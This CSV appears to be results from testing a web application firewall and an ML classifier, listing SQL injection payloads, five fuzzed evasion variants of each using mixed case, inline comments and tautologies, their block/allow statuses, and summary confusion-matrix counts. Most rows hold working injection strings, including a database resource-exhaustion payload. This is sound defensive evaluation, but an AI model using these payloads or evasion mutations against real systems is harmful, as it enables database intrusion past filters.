Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
46,2024-12-16T20:14:44.780177,"-8309'||  (  select 'qecl' where 8449  =  8449 union all select 8449,8449,8449,8449,8449,8449,8449--",403,403,403,both_correct,"-8309'||  (  select 'qecl'/**/WhERe	8449   LIKE   8449 union all SeleCt 8449,8449,8449,8449,9926<>9927, AND 1,0x2101--",2024-12-16T20:14:49.526495,403,403,both_correct,"-8309'||  (  select 'qecl' whEre	(SELECT 1)
  Like   9306!=9307 union all selEct (SELECT 8449),8449,8449,8449,9926 not like 9927, aNd 1,0x2101--",2024-12-16T20:14:56.256528,403,403,both_correct,"-8309'||  (  select 'qecl' whEre
(SELECT 1)
  Like   0x245a!=9307 union all selEct (SELECT  AND 1),8449,8449,8449,'E'='E' not like/**/9927, and 1,0x2101--",2024-12-16T20:15:04.127836,403,403,both_correct,"-'?'<>'?r''||  (  select 'qecl'/**/whEre
(SELECT 1)
  Like   0x245a!=(SELECT 9307) union all selEct (SELECT  AND (SELECT 1)),8449,8449,8449,'E'='E'
not like/**/9927, AnD 1,0x2101--",2024-12-16T20:15:12.719301,403,403,both_correct,"-'?'<>'?r''||  (  select 'qecl'/**/whEre
(SELECT 1)
  Like   0x245a!=(SELECT	0x245b) union all selEct (SELECT  AND (SELECT 1)),8449,8449, OR 0,'E'='E'
not like 9927, anD 7365 like 7365,0x2101--",2024-12-16T20:15:22.260785,403,403,both_correct
47,2024-12-16T20:15:32.745559,29639,200,200,403,waf_correct_ml_incorrect,(seLecT  Or 0),2024-12-16T20:15:33.119938,403,200,waf_incorrect_ml_correct,"(selECt
/**/Or  AND 1)",2024-12-16T20:15:34.892491,403,200,waf_incorrect_ml_correct,"(SeleCT
/**/Or  aNd/**/(SeLeCt 'n' lIKe
'n'))",2024-12-16T20:15:37.078144,403,200,waf_incorrect_ml_correct,(seLEcT	/*zj{*/OR  aND (SELeCt  AND 1!=5600)),2024-12-16T20:15:40.307829,403,200,waf_incorrect_ml_correct,(SelEcT /**/oR  anD (SELeCt/**/ ANd 5649!=(SelEcT 5650) NOT LIKE (SELECT 1))),2024-12-16T20:15:43.531743,403,403,both_incorrect
48,2024-12-16T20:15:48.286068,select case when 7634  =  3954 then 1 else null end--,403,200,200,both_incorrect,"SelECT CasE WHEN
0x1dd2  =/**/  anD 1 thEN 9006 not like 9007 ELSE null END--",2024-12-16T20:15:50.927102,200,403,waf_incorrect_ml_correct,"seleCT caSE WHeN
0x1dd2   LIke /**/  AND	(SelEcT 1) thEN  AND 1 not/**/LiKE '+'!='+2' ElsE null ENd--",2024-12-16T20:15:55.631483,200,200,both_incorrect,SElECt cAsE When 0x1dd2   liKe /**/  AnD	(SElECT (seleCt 1)) tHEN  ANd 'x' LIKE 'x' not LiKE '+' not like '+ OR 0' elSe null end--,2024-12-16T20:16:01.703672,200,403,waf_incorrect_ml_correct,sELeCt CASE wHEN 0x1dd2   lIKe /**/  ANd	(seleCt (Select 'G'='G')) theN/**/ And 'x' likE 'x' not	LiKE '+' not like '+ OR  AND (SELECT 1)' ElSE null EnD--,2024-12-16T20:16:08.985882,200,403,waf_incorrect_ml_correct,SElECT CAsE when 0x1dd2   LiKE /**/  AnD	(SelecT (SEleCt 'G' lIke 'G')) thEn/**/ AND 'x' liKe 'x' not	LiKE '+' not like '+ OR /*K-(SELECT 1)*/AND (SELECT 'C0'!='C00')' ELse	null ENd--,2024-12-16T20:16:17.251037,200,403,waf_incorrect_ml_correct
49,2024-12-16T20:16:27.031988,"1'+  (  select 'mxei' where 7811  =  7811 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",403,403,200,waf_correct_ml_incorrect,"1'+  (  select 'mxei' where 7811  =  7811 and char  (  109  )  ||char  (	 79  )  ||char  ( /*1M*/70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  (SELECT 5012)  )  , AND 1  )  ,'/#`'='/#`'  )  ,null  )  --",2024-12-16T20:16:37.422407,403,403,both_correct,"9824 IN (9823,9824,9825)'+  (  select 'mxei' where 7811  =  7811 and char  (  109  )  ||char  (  79  )  ||char  ( /*uFX*/70  )  ||char  (  90  )  /**/ =  regexp_substring  (  repeat  (  right  (  char  (  (SELECT 5012)  )  , AND (SELECT  OR 0)  )  ,'/#`'='/#`'  )  ,null  )  --",2024-12-16T20:16:49.533688,403,403,both_correct,"9824 In (0x265f,9824,9825)'+  (  select 'mxei' where 7811  =  7811 and char  (  (SELECT 1)  )  ||char  (  79  )  ||char  ( /*uFX*/70  )  ||char 	(  90  )  /**/ =  regexp_substring  (  repeat/**/ (  right  (  char  (  (SELECT 5012)  )  , AND (SELECT  OR 've' NOT LIKE 'vec')  )  ,'/#`'='/#`'  )  ,null  )  --M$",2024-12-16T20:17:03.876681,403,403,both_correct,"(SELECT (SELECT 1)) iN (0x265f,9824,9825)'+  (  select 'mxei' where 7811  =  7811 and char  (  (SELECT 1)  )  ||char  (  ' ' NOT LIKE ' )'  )  ||char  ( /*_/aXh*/70  )  ||char 	(  90 	)  /**/ =  regexp_substring  (  repeat/**/ (  right  (  char  (  (SELECT 5012)  )  , AND (SELECT  OR 've' NOT LIKE 'vec')  )/**/ ,'/#`'='/#`'  )  ,null  )  --M$",2024-12-16T20:17:19.647824,403,403,both_correct,"(SELECt (sElEct 1)) In (0x265f,9824,9825)'+  (  select 'mxei' where 7811  =  9322 LIKE 9322 and char  (  (SELECT (SELECT 1))  )  ||char  (  ' ' NOT LIKE ' )'  )  ||char  ( /*_/aXh*/70  )  ||char 	(  90 
)  /**/ =  regexp_substring  (  repeat/**/ (  right  (  char  (  (SELECT (SELECT 1))  )  , AND (SELECT  OR 've' NOT/**/LIKE 'vec')  )/*!Mvgl*/ ,'/#`'='/#`'  )  ,null  )  --M$",2024-12-16T20:17:36.751998,403,403,both_correct
50,2024-12-16T20:17:55.839902,98810075m,200,200,200,both_correct,98810075m,2024-12-16T20:17:56.386552,200,200,both_correct,98810075m,2024-12-16T20:17:57.938750,200,200,both_correct,98810075m,2024-12-16T20:17:59.507745,200,200,both_correct,98810075m,2024-12-16T20:18:01.045009,200,200,both_correct,98810075m,2024-12-16T20:18:02.590604,200,200,both_correct

Overall Results
WAF TP,141
WAF TN,125
WAF FP,19
WAF FN,15
ML TP,105
ML TN,129
ML FP,15
ML FN,51

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,218,16
ML Incorrect,48,18
